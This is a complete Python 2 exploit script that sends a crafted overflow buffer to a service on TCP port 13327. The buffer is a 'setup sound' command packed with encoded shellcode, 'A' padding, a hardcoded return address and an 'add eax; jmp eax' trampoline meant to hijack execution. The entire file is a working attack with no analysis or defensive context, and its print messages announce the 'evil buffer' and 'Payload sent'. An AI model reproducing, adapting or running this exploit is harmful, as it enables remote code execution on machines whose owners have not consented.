#!/usr/bin/python
import socket

# nasm > add eax,12
# 00000000  83C00C            add eax,byte +0xc
# nasm > jmp eax
# 00000000  FFE0              jmp eax


host = "127.0.0.1"

# return address 0x08134597

ret = "\x97\x45\x13\x08"

shellcode = (
"\xbe\x19\x56\xe0\xa7\xd9\xca\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x14\x31\x72\x14\x83\xc2\x04\x03\x72\x10\xfb\xa3\xd1\x7c\x0c"
"\xa8\x41\xc0\xa1\x45\x64\x4f\xa4\x2a\x0e\x82\xa6\x10\x91\x4e"
"\xce\xa4\x2d\x7e\x52\xc3\x3d\xd1\x3a\x9a\xdf\xbb\xdc\xc4\xd2"
"\xbc\xa9\xb4\xe8\x0f\xad\x86\x97\xa2\x2d\xa5\xe7\x5b\xe0\xaa"
"\x9b\xfd\x90\x95\xc3\x30\xe4\xa3\x8a\x32\x8c\x1c\x42\xb0\x24"
"\x0b\xb3\x54\xdd\xa5\x42\x7b\x4d\x69\xdc\x9d\xdd\x86\x13\xdd"
)


crash = shellcode + "\x41" * (4368-105) + ret + "\x83\xc0\x0c\xff\xe0" + "\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect ((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload sent !" 
